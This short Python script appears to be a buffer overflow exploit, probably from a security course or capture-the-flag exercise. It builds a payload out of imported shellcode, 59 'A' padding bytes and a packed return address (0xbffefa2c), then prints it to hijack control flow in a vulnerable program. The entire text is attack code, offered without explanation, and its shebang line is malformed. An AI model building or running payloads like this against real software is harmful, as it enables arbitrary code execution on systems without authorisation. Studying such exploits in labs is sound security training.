#!/user/bin/bash/python

from struct import pack
from shellcode import shellcode

addr = pack("<I", 0xbffefa2c)
print(shellcode + "A"*59 + addr)
